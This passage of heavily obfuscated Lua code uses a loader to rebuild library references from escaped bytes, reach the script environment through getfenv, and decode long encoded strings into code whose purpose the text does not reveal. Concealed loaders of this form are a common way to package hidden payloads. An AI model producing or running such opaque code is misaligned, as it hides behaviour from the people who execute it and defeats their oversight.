pga:%4K4U,I4Ia%g4ggMrgIP_%4_%Q%MI4uK4U",""};return(function(f,...)local r;local c;local p;local l;local t;local s;local e=24915;local n=0;local d={};while n<414 do n=n+1;while n<0x340 and e%0x3e18<0x1f0c do n=n+1 e=(e*921)%38121 local h=n+e if(e%0x9b2)<0x4d9 then e=(e-0x1bd)%0x6d8f while n<0x3d1 and e%0x1d82<0xec1 do n=n+1 e=(e+660)%31484 local t=n+e if(e%0x4240)<0x2120 then e=(e-0x165)%0x1d5e local e=21916 if not d[e]then d[e]=0x1 p=string;end elseif e%2~=0 then e=(e*0x312)%0x1fb2 local e=44424 if not d[e]then d[e]=0x1 c={};end else e=(e-0x2af)%0x3669 n=n+1 local e=14119 if not d[e]then d[e]=0x1 s=tonumber;end end end elseif e%2~=0 then e=(e-0x31)%0x94ec while n<0x109 and e%0x3678<0x1b3c do n=n+1 e=(e-746)%21254 local h=n+e if(e%0x41b4)<=0x20da then e=(e+0xda)%0x15ca local e=20068 if not d[e]then d[e]=0x1 end elseif e%2~=0 then e=(e+0x132)%0x5e5e local e=70784 if not d[e]then d[e]=0x1 l=function(l)local e=0x01 local function d(n)e=e+n return l:sub(e-n,e-0x01)end while true do local n=d(0x01)if(n=="\5")then break end local e=p.byte(d(0x01))local e=d(e)if n=="\2"then e=c.oJxovvpj(e)elseif n=="\3"then e=e~="\0"elseif n=="\6"then t[e]=function(e,n)return f(8,nil,f,n,e)end elseif n=="\4"then e=t[e]elseif n=="\0"then e=t[e][d(p.byte(d(0x01)))];end local n=d(0x08)c[n]=e end end end else e=(e-0x12f)%0x7e17 n=n+1 local e=20646 if not d[e]then d[e]=0x1 r="\4\8\116\111\110\117\109\98\101\114\111\74\120\111\118\118\112\106\0\6\115\116\114\105\110\103\4\99\104\97\114\66\112\95\82\82\67\107\76\0\6\115\116\114\105\110\103\3\115\117\98\79\119\119\74\105\89\117\102\0\6\115\116\114\105\110\103\4\98\121\116\101\103\108\85\122\103\121\87\77\0\5\116\97\98\108\101\6\99\111\110\99\97\116\90\115\90\115\81\68\73\122\0\5\116\97\98\108\101\6\105\110\115\101\114\116\79\115\122\83\95\105\100\97\5";end end end else e=(e*0x286)%0x9cc5 n=n+1 while n<0x2b9 and e%0x35be<0x1adf do n=n+1 e=(e+344)%43196 local l=n+e if(e%0x1d98)<0xecc then e=(e-0x378)%0x86a0 local e=18136 if not d[e]then d[e]=0x1 t=getfenv and getfenv();end elseif e%2~=0 then e=(e-0x280)%0x8845 local e=57314 if not d[e]then d[e]=0x1 t=(not t)and _ENV or t;end else e=(e+0x104)%0x95b1 n=n+1 local e=58058 if not d[e]then d[e]=0x1 end end end end end e=(e*136)%38819 end l(r);local n={};for e=0x0,0xff do local d=c.Bp_RRCkL(e);n[e]=d;n[d]=e;end local function h(e)return n[e];end local p=(function(f,l)local r,d=0x01,0x10 local n={{},{},{}}local t=-0x01 local e=0x01 local p=f while true do n[0x03][c.OwwJiYuf(l,e,(function()e=r+e return e-0x01 end)())]=(function()t=t+0x01 return t end)()if t==(0x0f)then t=""d=0x000 break end end local t=#l while e<t+0x01 do n[0x02][d]=c.OwwJiYuf(l,e,(function()e=r+e return e-0x01 end)())d=d+0x01 if d%0x02==0x00 then d=0x00 c.OszS_ida(n[0x01],(h((((n[0x03][n[0x02][0x00]]or 0x00)*0x10)+(n[0x03][n[0x02][0x01]]or 0x00)+p)%0x100)));p=f+p;end end return c.ZsZsQDIz(n[0x01])end);l(p(153,"kp?w4FMhl5Ny<_)QM5_wMM<<wl5yPlhN)hM<_QpQ54pNh)h?_lM)QMh)<F?p55Q5h4<h_Q4F_<F<y<F5<ap_hyQr4y4<y445yFp<N)Shh_QFF055C_M4lh))l4)NM4QMMFy<?wM5_hFyFy<FF5<F?F54QyMQ_lhpNFpM5<)_MlM4<_Mp<)wM55&)lw(w4y<<4M55QpdMM)8Nh?_?45<hwhNhQ<M5)44_4pN54FNlpwlypwFw<Mww5</QM<h<)MhN)44MNQp5y5?4l?<wFRyQpMh_lF)_l4))F?_MFl<l{ylw)_Fy<)<a?l<p?hl<{5l_Q<4)<wwlM<__QyMFQlFQ<)w>5hp)5h)lFw<)?wNwVQB4M<A?M)_8hM<_w)NpQwMhyFpQwQNhw<NF!QNhpNh<_5?p5wp<FFhN)?hh)F4_<w4_5)Q?l<_e4l54yFp_ywp5hQp<M4)_4wyw?hMhQwQiFlQwFl<wF)<=whlaQFwhNp?y?y5F?y5VQ_F)<wF4Nh4?5F)MM?_h?ww45_wpNaj4M50_hwy44cNYQFFO<?_Mw)_y4pN?p<NQQ_F?_?FwNlQ<pph5pph_)?FhQ?45<DQFh5_wwN4<y445y7ply?QlMQ)hwwyyp_Mwlh)_lM?)hN<NFyy_?MM_QpQ4FNQ45F)?FlNv?5h?_445Mp<hFQQ)My_?wwhN^p4py5<)w4<Q4Ny5wwNy)w4N_<4FwyNpw__pp_5MQhFp_ypNllNlpHNMpShlQlMN<)?Ml5zwFh)))w4N)p4M_<?<5<Uylh<FF;y)yhp)yMp<<?p#lh<NF)5Qp4h4lyQ?l5)QhlQyM4<Q??5<xhFvFQ<MF)<ww__MpMlh)FFM<<wlww5<wp5MupMyp4hF__p5l_ZpFl_<_Fw)_?wlNpf55<D5FiywpN5pp5lhhh_)hl_<Fh<4w5ylQ_F5)N?Q4yy?4ly4Fp5Qt5F<)<4p54?ppQlMp_lyQylF)pFQ5hp4lN_RQwFNQMF<Q5wMN<pNl</5FyyT<h?)<h?yyhpph))FhFN_pQN45yY?55}MNm)yFwN<4?Nl8phlMQ_MM<_5Fl_h?plN))4_<_Fz4wNN44N54pypQQhly<?ly4p<phh)phh)?5hQ<l4Q5xpl5z_4)yFp))MMQNFNN?mNMF)h4wFlyQFlyywFy?pJM5__w<<4ww?<5w?<5ppp5F)_MMyy?plw/M.SMha4Mh)Mhy)pp4NlpFF4)4_4wN_5My)p?<5_(lh)_M4F4pNl4(N4w_yh,)lF_pw_5Qp5pFh<p5lpQMF_yQ4y5MQ_MQ_?)<"));l(p(37,"o#^S9x4lN_fY6-3d-YY6v937Y_NY4YSdYld^-3Y#Nd4QS6#l3SYyfwlY4x-4Y^dN64_dNx4(9^dY34f#fx46S6#YfNNl6-ffl6x6S-(46lfYf)xx9-#SX3l6x-fxN#xf^6A63Tx__64Yx_^SCS6#_S4-x^94^N--YN93^-l#91^3d-lxYlNf44x9^ld6Y_fY_6l^^=#x-{43x#_S4C9f#3d#-YfS_#x_Sx#f33fd_94x4_S#d#3l-495#39NS^tYdl6-fY9lxN9S#9-Nf9ll49x-6Yf4d9Y__6N^x-#_#l66Y4lY43x_6S_-YpY4_llx96SSd6Yf__^3:-x9^fZ_3xY3_glz99#60lY^_34-l_S9#N_qlWYfN^x39S#l_S--Y#N3xfSl#fdlffYSN3x_Swd63N449SN-4#S3Qf3l6f_Yx4SlS^?ld_fdN6#4d^SN#x3l6lfNx94#SNdx3_f4f4l33-6f##3l64f^lY9-^-{#Yl_-43xl9f^d3N64xS^-lSx=^^E^3Sf3_94394#YCfYN_4^45S9Y#Ndf63fl_S939fdf-4Y4Y9NxSf-^Y#dx69Y^N#d_Sx#4d96df-x_SY9#d33dYSlYxYdS"));sV_kkXaVaytDTXf=function(e)e((-c.BHfrKYxu+(function()local d,e=c.QrRGXQeQ,c.JCyyofth;(function(n,e)e(n(e,n),n(e,e)and n(e,n))end)(function(n,t)if d>c.aSbsgIVF then return n end d=d+c.JCyyofth e=(e-c.CnvffELi)%c.EGyFPoYm if(e%c.BPiJdwcT)>c.BYbkY_su then e=(e+c.IjCOUWcY)%c.nriCiqaa return n(t(n,t),n(t,n))else return n end return t end,function(n,t)if d>c.PktPadkw then return t end d=d+c.JCyyofth e=(e*c.HemXftAK)%c.TfPThVot if(e%c.qakgR_FI)>=c.gsndEPrD then return n(t(t,n),n(n,t)and n(n,t))else return n end return n end)return e;end)()))end;fXTDtyaVaXkk_Vs={c.dtDUIzZc,c.EwsUnPur};local e=(c.HkUBuRcH+(function()local d,e=c.QrRGXQeQ,c.JCyyofth;(function(e)e(e(e))end)(function(n)if d>c.fGiXanGl then return n end d=d+c.JCyyofth e=(e-c.mhxZhCFi)%c.ZFzfPesX if(e%c.qpJohVJU)<c.EqXF_ygT then e=(e*c.EyiyGdWW)%c.eDTeJkfE return n(n(n))else return n end return n end)return e;end)())local h=c.aAGgaxSU or c.mEssc_Pa;local pe=(getfenv)or(function()return _ENV end);local l=c.tYBlgiIf;local r=c.nTcDfHCQ;local t=c.jppjJjCT;local m=c.JCyyofth;local function le(_,...)local o=p(e,"{*pnKO}xCX2RcF0.Oc*}p*pcn2KxKFOC}n}c0*RRcnFw2CRORRc}F*F2CKxXpXFp*}nCpXnKn.KC.OpppFnxpxKKKFOKOnx.CCC2X2X0ROXOc*cxFpF0.pFLS0*Xpp}RxXx0CXXKXF}F}RxKC2XO0K.*.x(pDF*}0p.^0F.ROpO0}OxvxRCKOx}KOcROcKcCFnF00xR2c}c.F*0*0OnXK.KcOx}p}R0pKnRcKK0.n^FF22.,2pFOcc.mV2*x*FpCnnncRKnn*!O}x}CfCRX}2*2cRx.pSFFR0C00.X=K_F.Rp0R}0nKxO*Oc}xxpxFCCXnX02cc*R.c2FOF0FXpF*cx0Rw0Xn2.cc0*FCc0nxpx0COX,XReX*X*FnXFnFF0C.n.0WX.KC0}2n}KIKRO}}*}c.xcCcFXX2n20RXcKc.F2dRne.0GR***cpxnS0KCR}*0p}c0px.C2XOX0pFnxKpK0OC}n}.RxcRcpc.FF0xMOcx!2*npFpFnFK0K2}p}X}xxFC.2?2O2,2XR.c2X}0(000R.X*n*.pCp2n2n0**O}}RxpCKx0X}2}2c20cKc.cRF.FF.R<}d.***OnnnFnX..*2}Fn3nRK}O*Oc}0xpxFxCF2c.0cc2.K.0_2pp*cnppnK*KCO0}XC*ORCnXRXXCER0cXFpFKFC.}_9.c0*OF}2x&xRC}C.nFFF.pcRcR0nF00X.K.FnKppO2}CCKcC8x0*R2.2nFCx.2R..XRpcKcOFqFR0KnyF0*np2n.c0}KCnFnOx}0}2xOCb.00c64*xpp*2p0p0KK}x}FKC}nxpCRnnn.K}O*OccX0R.*0FX}2c2XRKR.cCnpO}C}FR2gcp.2ORC*F*}}OCnc}O}.x2COX7XR2}2*.Rc2XKF.0C.n.c}Xx*x.CxX*FKR0*X*Fppn0K2OpO_*}xO}FCpCxXROC2XcscCF*C..n.K_OoFc}pCp*pXnOn0OOpFQR*nnKn.K2OO}h}Rx}CFCcXx2p2FRCcnc0FX0K0..2:OK.pXnKn.xRKxOpOF}Cxnx0CXXKX.22ROc#FxcncR0c.xQp%F*CpnCXKvOpK.O2}Ox3xRC}X*Xc2xcucKcCFnF00X.K-}*C*Op3pRn}K*KcOx}p}FC}C20RC}C02.R2cOFZFRK*.*O2&x*XpRpCnnn0KXOKO.2XF*XFCRX}2*2c.}9*pX*x0n00.XYKf.*2nnnxnRK}2.RXOKOcxFCCXnX0_KRK*Fc2FOn00R.FQ0*2O}ppnOxxCpCFXC2n20RXcKc.F20OR2Rcr}0;020.O*.0DXxp*.p2XppFnOO}}*}cFp0dCFXC)*20RXppc.F20OK03XlF***cpxnpnFKCOnO0}XxKx.X*2n29jXR}c*ccFxKq0F.CjnL0x}***Xn2KO2ROR}}c.xcCxXp.R2CRn*ccX0nF.02.O .Kx*}p*pcnxKpOcXK}n}0xXcvC.X22O30RRc}F*FcKO.p.F}OMvACpXnKX2K2OO}zcXx}C*Cc.O2p2Fcxcnc0FX0Kp0nX9O*Q*Rp}n*xRC}OpOF}CxnR2CX.pX.22RO*0cRF}0*0cOK0..x*Cpnp0XKKKK.O2cnxVxRXOcF2R2xRpc20KFRF0nC.F..T2*OpCpRCOK2}2}K}p}FRKXpc2XX8p2.R2cOp0nCFnFR.cGx*p*FCnnnXcKXOKO.COxFCuCRX}2*2cRx.0FcFC.*.R9xLKKRpXpOnGnRK}O*Ocx,CFxFCCXn.c2X**2cRKFO0P0R.};*}x*xCspFX}x.CFOX}KxxCnCOXjFX2}RXRccxFp0}0Cn*.0yX*cpCp2nOx.O2O}R.}cxxF.x2Cp2n20RXcKc.F20c.F?XKO}.*c}nnpnFKCORX0x}CpR0X*2p2x02cKc0Fn0S0p0F.C*p90xx}nnFKxKcnFKO}}x*xcCxXpXF2CRnR0cXFR0c.xn*W<VR*}}*nnKOC*OKO2}22FCxCRc.X22ORdc2FnF00nFKFc.FUC*n*0pXnKn.K2OO}j}Rx}C*CcFn2p2FRCcnc0*OpK.c?**K*Z*Rp}n*ncO}n.Kx}Cxnx0CXXKX.22ROc#cRF}0*0c.xSpKFOKpnp0nXKKO}}x}cxSxRC}X*2R20X.2xcCFnF00X.K..92*OpMpRn}K*KcOx}p}FRCR.C0XX2K2.R2cOF)FR0},S1n.K.c*FpCnnn0KXOKO.}2xOCYCRX}2*2cRxcpcFFC02.OY}*p*FpCnpnxKpnnnROc}xxpxFCCXnX02XRKR.c2FO0I0R.}?*nKOCxZx*CRKnCn2X}K2pcOc0FKCCX>X02}Ox}.}2xOCMCXK.KcOnK0CXXXCcCc2p2KcpcFccc0.}n0KRO*Oc}x0}F002..Un2ccOR.c2FOF0XC2C222KF*0pFC0OFx*d*ppOp}n0KXKFX02RR*RccxFHXnX0*gppu2*K*.p2nOKMKRX22*}FxxCpCFXC2n20c*uKFp0n0O.h.R8KFCF00F.XhptK*K*C}2xKx.C2XO2QpRW*9*cFFx0p0F.CenC0O0}KnpKCKOOuOR}KCpK2RXp2...Xc*xXR.CX*c*sK2<n*h*}p*pcnO.CTC>cpCx*x0CKC.X22nOxxOxXRYF.02.p.FoCC}XnCRnOn.K2OO}B}Rx}RFccX22F2FRCcncc0*20pKX4?2X}0C0}Kc0pK2CpOF}CxnxcnOO}}x}.pCCnC2C22C2ORXcxcFCRF..K2cjc*Nl0*2p.nn.XOCO0*2}2CCC8CX2}Ra2cxpF*F%Fc.*2X1x,p*c*0n/n.tKC.XX2K2.R2cOFMQ.p}.p.cWx*p*FpCnnOpCXOOO.}2xOCuCRX}2*0cR2cxcFFC0n0cCR2cRcx*p}nbnRK}O*Oc}xX2RFCRX0X02XRKRFKxx}XKKcXKF*XcpcdC.cnRKXK0OX}K0p00.x.X3XbFRKc*cxFpFF0}*}x0O}}*ppn}nOKBKROKRnpxXcOKOXpO}Kpcx22Cc}FR0O.I.Rr}***cKRxpK-K0OnO0}XxpKpK.O*}*xpRxc*ccFx0p0F.CpnK0*2pKp.n2KOOdORCpR*x.C.XpXF2CR*xCC*XRXC2pR}cXh0*2p*pcnxR}c}cCcCx*CnCKC.X22n*00}K0px22OOncF..0*K*0pXnKn.K2OOXp2RxXC}CcXx2p2R2cK.t*cc0x*%.2sO*W*Xc0F}.R0n+F*.3K*np8KKOn}-}cx}OCCjxX2XXOXnc.cCRCF2.X0n.F0Fp}TppppFCxX*Xc2xRpRFcCmc*00c.R..I2*O*0c0}pF*KF}}.2}0xCCnC0XX2K2.0K5OF*FR0}.*.c x*pn.}CnKn0KXOKO.}2.OcXcRXXRn2cRxcpcR}02OCpROX.R*R20FFC.X.c0F*c.cn.*nn.X}2R2XRKR.cCCxxR2FR<R}R*RxFX0O0cFczXOcxO}.x2COC0n0Kpnm}YC*X22hxO2ORp2XXR0K2pFn0CK0OF}*}cxx0C.c:2UC>.*cpcFYF20O.8.R6}**}*}xnnnFKCOnO0}XxKC.c2XC2O2RR}c*c22}XCpCH.TK/0*XpKp.n2KOC0XR}Xx}xcCxXpXRKp0}C.FFFx0002.O1UJXpOx}**0K.xRzRO2K*Rx2s0,XxCR>R*RRc}F*Fc0x.pKJKC*K*0pXnKn.K2OOxC2RxXC0CcXx2p2R*KcWxXOp0}c}nccXF}}F0.0pn.OpOpOF}Cx*nFKRKCO}xJxcCOCxXxXRn2.Crp&Fp2O.p0nXKK}}O2}Ox8C*XnX*Xc2x0*RFcXFnF00X.CXc&2*OprO2n}KpKcOx}p}FxCCnC0XX2K2.R2FXF:Fc0}.*.c+x*p*FK-nnn0KXOKO.}RxO2h3RX}2*2cRxcp0xFC.OO0.XTOh.p}pOn8nROCO0Oc}XxpXKCCXnX02.KcR.cFFO0K0R.xV*DF*xpp}2nCKnK0O2}K}.x2CO.RXR2CR*R0cxFnFF.2.x.0aR*KOXp2nOK+OF}0}*}.xxRKCFXC2nc0cKcKFpF20C.lpnh}pn*.pxn}nF}OOnO0}XXKC2C2XX2k2.R}zCcc0X0X0F.FynKP*XpKp.O2cOOk}_}}x}xcXOXp2.KcRncKcX^}F.02.Op#*X*}pxpcnFKp}OOC}nC}xXCRC.X22OR4RRFC0cFc0..prX8C*n*0nRK0n.OnOO}.}Rx}C*X02x2pRxRCFFc0FX0K.n6RaO*C*RK}n*nFKxOpX2}Cx.x0C0XKX.22RO<}cR0n0*.x.x)pfF*CpRp0KOKKO*O2}xxYxRCxX*2n2xRFRFFKFnF0._.KN}^2p*pIn}n}KO2gOx}2}FXpCnC.XX2K.CR2cFFt0n0}.*.chF22*FnWnnn0KXOOO.xsxOC_cCX}2*2cRXcpcFFC0npR.XbK-.*0pOn+nRK}C0Oc}xxpCOCCXnX02X.*R.c2FO0n0R.};*tcOKpppFnCK2K0OX}K}.RxCOXVXR2xR*RccxFp}c0C.c.0***K*.p2nOORKR}k}*}cxxCpCFXCR}20cpcKF*F20x.t.Rpn***cpxnRnFKCOnO0}2xKx.C2Xx2y2RR}c*FFFx0p0F.C;nk0*XpCn}n2KOO/2C}xxpxcXX2RXF2CRnF2cXFKF.>2K2v5?R*}p*pcO*KpO.}F}n}0xX2}C.X22OcpcOc}F*Fc?n.p.FuCnnpFpXnKn.K2OOC0}RCCCcCcXx2p0nRCcnc0FX.x0..2:O***Rp}n*K0}*OpOF}Cx}x0CXXKR*cnROc9cR*K0*0c.xspxn*CpKp0nXKKK.O2}OxXxRCCX*Xc2xRpRFcC0.F00c.K..l2*OpdnFKCK*OqOx2C}FxCCn2YRO2KRKR2F*F7FR0}Yn.F^x*C*Fnxnnn0KX}}xc}2xcC,2OX}2*2cRRF0cFFF0nn}.XuO#.pcn0n8KKK}OCOc}xxpXFcXXn2x2XRFR..>FO0r0..}sR3c*.pppFnCKn}XOX}F}.xcCOXpXR2}cORccXFp0O0C.c.0kX*R*.nnnOKpKRO0}*}cxRCpC.XC2c20c*cKFnp00O.O.RK}***FpxKKRCKCOCO0CnxKx.C22x.}2RRcc*F}Fx0p0Ft2*K>0pbpKKXn2KOO9O.xFx*C*Cx0RXF2XRnF0K}FK0C02.F^VpO*}K*n0nxKcKFOc}nxKxXCKXFX2R*Rscnc}F*Fc0x.x.F*O*np}pXnKn.K2}O}ixOx}C0CcXX2p2FcXcnF*FX0F0.5K+Onannp}n2ncKROp}n}CxnC0CXX.X.RpROcTcRF}*00cJnQp*O*Cpnp0nX0pK.}n}OxcxRCCX*Rc2RRpcxcCFRF08n.K..pp*OpnpRn.K*O}Ox}}c*xCCCC00O2KRYR2cR}CFR0R.*.0ox*n*Fpcnnn0C}OKO.}2x}CzCRX}2*0XRxcpcFFC0n00.XrKKc*2pOnJn0K}O*Oc}x2.xFCCXn2Z2XRKR.Fc**0Y.*.}n28c*xppnnOpKnOKOXcX}.xRCOXtXR22K0RccxFpKp0C.K.0*RpF*.nYnOxXKRO}}*}c.*CpXnXC2K20RRcKFO020O.}.R}c***FpxnnnFKc.oO0}XxK0OC2X}2;RFc.c*FpFx6r0F.C#n!0O}pKn}n2K2O5OR}}Cn.OCxX2XFc.RnR0cX0}.R02.04TpO*}p*pcKXOLKF}p}nC.xXCKC.2c20Rhc}c}*0Fc0x.pL.1X*np2pXxnn.K2OO}GxKx}CCCc2n2p2.RCcnFxFX0c0...HO*;*RnC22ncO-OpO.}Cxnx0XR2CX.RKRO00cRF}0*.0.2Qp*C*CKKp0nXKK}*}*}OxcxRc}X*Xc2xcKFncC0gF0.X.K..w2*Op2pRn0K*OXOx}K}FxCXpC02p2KRKR2cOFh0FO..*z}^xpK*FpCnnO/OKOK}2}2X}CDCRX}RnR}Rxc0cF*B0n00.X*}*p*2npn%CRK}O*OcxXxFxFX}Xn0*2XRKR.c2F20y.K.}W.Dc*XpppFKXKnOCOX}X}.x2CO2p*}2}RcRc.2FpFF0CBOxX/Xpi*.xnnOKDKR}CFc}cCKCpFcXC2n20cRO.c.0C0OpK.RI}**p0K*npKcKCxcO0}XxKx.XCXO222RcOc*c0Fx0p.x.CN0h0*RpKp.n2KO}KORxpx*C*CxXpXFR2c*R0F}FK*c02.O6e*Fpnp*n2nx}.KFOC}nC3.OCKX0X2FcRfRRc}0n.K0xQp.Fnp*n*0pXK}K}K2}}}8Xxx}C*CcXx2C2FcKcnF.FX0}0..2*2*_pCp}n}ncKxOp}.xXxnCcCXX.X.22ROFpFxF}.%0cK}<poF*CnO2XnXOKK.Xp}Ox+xRXCGcXcRCRpFncCFnF0.R.0..*c*Op2pRn}K*KcO.}px2xCXOC0XR2K2.c0cOFRFR.n.*.FHxpKXCpCn.n0}KOKO.}2xO2KCR2n2*R*RxcpcF02.K00^x5K*C*2pOn%KFOKO*}R}x22xFCCXnR5R}RKc.c2up0)0R.}*np}*xnnpFKFKnK0OXx}x0x2XxXiFx2}R*Rccx0lFF.O.n*JiX*}*.p2nCK:OCO}}x}cCKCpX.pR2nRcRXF=c.F20OHp.F_}p_*cn2npnFKCOn}K}XCKx.XEXO2x2RRcc0cc0x0pC0.CdKb0*2pKnnFxKOO6OR_xx*xFCxX}n22CRnR0C}FK0N02(xxRjRp}p*K}nxKpKFOCR2}0C2CKX2X22ORjcFFKF*000x&c.F=C*nppnxnKK.K2**}h}cx}C*C.XxR}2Fcncn0*FX0Kp*.2*X*_p*p}KOncKFOXOFxcxnnXCXXOX.22ROcK}CF}0*0cRp3pB0*Cpnn*nXOCK.}W}OxxxRC}nKXcRRRpF*cCFRF00X.}..*.*OpRpRKXK*KcOF}pCpxCCXC0202K2.cRcO0KFR0C.*.01x*pnOpCKxn0OFOK}C}2xOXKCR222*cGRxcpcF.0.}00_F(Kc2*2p}nSOcK}OO.X}xxpxFKnXnX.2XRK.cc20X04.C.}t*bc*xRKpFKFKnO2OX}K}.x2C2XB2.2}RnRccCFp0.0X.n*pEXOX*.p2nOK5OnO}xO}cxCCpC0XC2ncRRXcKc.FR0O.U.R<}pp*cnRnpO*KCOnO0}R0Cx.X.XO2x2RR}c*ccx}0p5p.CEK)0*2pKnnC0KO}uOR1Rx*xFCxRpF}2Cc*R0FxFK.X02.OnFfRp}p*n*nxKpKF}2Fc}0C2CK2nX22ORDcF0pF*000xpX.F/C*nn_n0nKOpK2Cp}M}Rx}XnXOXxR}2FcOcnc0FX.}.*.2*2*-}np}n*ncKxO.OFxCxnXnCXX}X.22RRc<FnF}.*0c.x+pUFncpnn0nXKXK.O2}OCpx.C}2pXcc}RpRFcC0O0C0Xo}..Kc*OpdpRKCO0Kc}2}pC0xCCnC02Rc*2.c0cO.OFR0}.*L0p**pnppCO}n0KXOKO.xnxOXdCR2R2*20Rxcpi2FC0c00-X+K,.*2pOnnnRO}O*}p}xx2xFC0XRX0RkRKX*c2F}0M.R.}4O2X*xpppFl2KnK.OX}Kxpx2XOXQ2*2}RCRccxFOFF0..ne01X*c*.p2nCKzORO}}x}cCmCpXn2Z2nR}RX2*c.FR0Ofs.Ri220*cpxnp*2KCOKO0}XR*x.X2XO2O2RR}c*F0}R0p.0.CsK30*XpKK*KpKO}pORXRx*xcCx2K2O2Cc}R07*FKF.02=x*xNRp2p*OFnxKpKF}2x2}0C0CKRCX22OR6RRFcF*0c0xSx.Fh2*n*0KOnKKxK2OR}-xRx}Xn xXxRp2FFpcnc0FX0KK}.2*}*#p}p}n*ncOXOnOFx2xnXCCXXKX.20Fpc)FRF}c00c.CPp*.n*pnKpnXKCK.O2}Ox}*nC}2}Xc2cRpR0cCF2F00Xn*..,2*OpCpRn}K*KcXK}p}FxCC0C0XX2K2..xcOF6FR.X.*.cwx*pO2pCnnn0OwOKO.}2xORFCRX}2*R2RxcpcFFCp(00.XDK*c*2pOnenRCnO*Oc}xx0xFCCXnX09FRKFnc2Fx0y0c.}w*t.*xnOpFnCKnK0OX}Ccnx2XOX^xc2}RpRc0F0nFF.}.n.}-X*O*.n}nOKK0CO}}*}c}.CpC0XC2n0RRXFKc.0x0O.W.R*CxR*cnCnp}CKCOnO0}XC0x.X2XO2p2RRxc*F00.0p.F.CKC/0*XpKp.KcKO}dOR}xx*xFCxXpRn2CRnR0c2FKF.02.Oh.oRp}p*ncnxKpKFO2Fx}0C2CKXxX22ORDRR}OF*0F0x.n.FmX*nn02XnKK.K2}j}_XXx}C*X2Xx2X2FR0cnF0FX.}.2.2*O*fnOp}n*ncKx}*OFxXxnCXCXXKX.RccOcEFFF}.R0c.xEp**pxpnn0nXOIO/OR}Oxex0C}2OXcRpRpFVcCFnOK0XzC..*_*OnKpRncK}Kc}R}pxCxXCKC02}2KRnOxcOFqFR.*.p.Fvx*pO2pCKxn0O}OKO.}2xO*pCR2R2*RCRxcpcFFC0F00#FuK***2p}n<KFKxO*xl}xRxxFCCXnX0c*RKFnc2F}0j0c.}/*pC*xpppFnXKnK0OX}KCCx2XXX_2.2}R*RccXK}FF.F.ny*qX*K*.p2FKKr}_O}}p}cxCCpX*0c2nR0RXcpc.FR0O.}Xn#}p**cpFnpn0KCOOO0}XR*x.C2XO2}2RR}c*cc*K0p0F.C9F&0*XpKp.2pKO}*OR}Xx*xcCx2KR}2CcOR0..FKF.02.O*xSRpXp*n*nxKpKF}2}F}0CFCKFXX22OR%cFFpF*.*0x,n.FGC*nn!KnnKOOK2Cp}h}Rx}Xn2pXxRX2FcQcnc0FX.}}2.2*F*l}}p}n*ncKxXpOFxRxnX}CXX}X.22Rcc7F.F}0}0c.x?p*.nVpnKnnXxnK.O2}OCpXVC}2xXcFxRpRFcC0O.g0X%R..K**Op1pRKCO}Kc}.}p2CxCCnC02R202.FncO.KFR0}.*.cxQ*pn*pCKcn0KROKO.XXxOX*CR222*2FRxFKKCFC.O00*n/Km.*2pOCxnROXO*}F}xxpxFX2XFX0RFRKFXc2FO050.a. **0*xOCp0nXKn}lFK}KCOx2X.X_XR2}R**ncx0XFF.n.n.08Xp}pCp2KFK1}OO}}*}cxRXxCF202n0nR2cOc.F2pp.m*O-}p**cpxnpnF22OnxX}Xx.x.2nXO2iR2R}FFcc0C0prp.C_npn*Xn0p.O}KOOpOR}cCFxc2*XpF*2XRKR0cXFK0nCx.OWJaRK2pppFnxKpC2OCxF}0C}CKC.X22ORFRR0*F*0C0x.p.F_CpC*0KnnKK*K2O}}yxFCFC*2}Xx0x2FRCcnc00O0KsX.2M}*+*cp}n*K0KxOpOF}Xxnx0CXXC.n22cRc:.nFx0p0c.RO}(Fp2pnOpn2KOK.}cx0x:CFC}0pXc2xRpcn}*Fn.Z0Xp0wyHR*Op*pRn2F0KcOx}p2xxXCKC02RRF2.cccOFOFR0}.*.cKK*pnSpCKOn0KXOKO.2FxOXKCR2C2*2cRxcpF.FC.C00.0UK>.*2nxn2nROcO*2C}xxpxFX2XXX0cyRKNdc2FO0W.F.C)*pK*xO2pFnCKn}?}&}KCCx2X0XzXR2}cncccx0cFF>C.n.0=X*KCCp2K2KH}OO}}n}cxxFFCF2c2nRfRXc}c.F20X.bi.8}*p*cpXnpK.O}Onxn}Xcpx.C2XORpRpR}Fxcc*R0p0F.Canpx*XnCp.OhKOO9OR}}CxxcX2XpXF2CROR0cRKCF..0.Og*GR*}p*pc2XKp}GOCxx}0xXCKC.X.2OcnRRc}F*Fc0x.p**ZC*n*0pXnKn.K2OO2C}Rx}C*CFXx2p2FRCccc0FX0K.}.2_O*4*cp}n*ncKxOpOFOCRpC*C2XKX.22RncnF*F}0*0c}2x}x.C*X*XOn2KKK.O2}OxExRC}F*X.2cRpRFcCKxn.KR}i}KbF*OpspRn}KpKcOx}p}FxCCn.0FXFC2.R2cOFq.}0}.p.cBx*p*FpCnnxRKXO}O.}2xOCUCRX}c}2cRCcpc.FC0O00*.*Ov.*RpOncnRKxO*}*}xx}*2CCXnX0RORKc>c2FO.R0R.x:*3F*xpppFnCCEK0OR}K}.x2COXz2*n0R*R.cxFpFF0X.n1MSX*KOcp2nOK#KRO}}*}cxx.XCFXC2nR/RXcKc.F20R.Q.c)}*K*cpCnpK*0OOnO0}X2}x.CRXO2yc}R}cpccFx0p0F.CZnKR*Xp}p.n2KOOmOR}}X}xcCCXpX.2CROR00..}F.0R.O*p?R*xp*p.nxK}02OC}n}0CRCKXJX22XKFRRc}F*+00x.n.F#Cn**0p2nKn.K2OO}TxXCcC*CFXxRC2FRXcnc.FX0CCc.2fO*#n*p}npncKR0.OF}CxnRfCXXOX.22FLc:ccF}0K0c.xhp;F}xpnnAnXKKK.O2}OCpXOC}XKXc2CRpRFcC0O.p0X.C..fR*OpEpRn}O2KcOC}px*xCCOC0R.R*2.RRcOkpFR0x.*.0ox*}R2pCnnn0xROK}s}2Cx.RCRXx2*RpRxcpcF02O000.RyK*n*2pOnbnRXFO*O.}xxpxFCCXnRQ20RKcnc2F}0y0R.}SO*;*xpKpF}XKnK.OX}K2cx2CRXhXc2}R*Rccx}vFF0..nBpBX*K*.p2nXK+OnO}}O}cxxCpCF2p2nRxRXcxc.F20O.u_})}*R*cpxnpnFKCOn}/}Xx.x.C.XO2%2RR}cFcc0n0p.p.CVn+0*Xnnp.KnKOOcOR}Cx*xcC2Xp2O2CRRR0FpFKF.*p.OsX+R*Rp*pcnxKp}2OC}R}0C*CKXCX2cORnRRc0F*0K0x.X.F4CpO*0n7nKK}K2OF}1}RCKC*CFXx2C2FR.cnFppF0K.*.2px*Z*cp}n*ORKxOnOF}2xnx0CXXKR022ROcTcFF}0*0c.xK2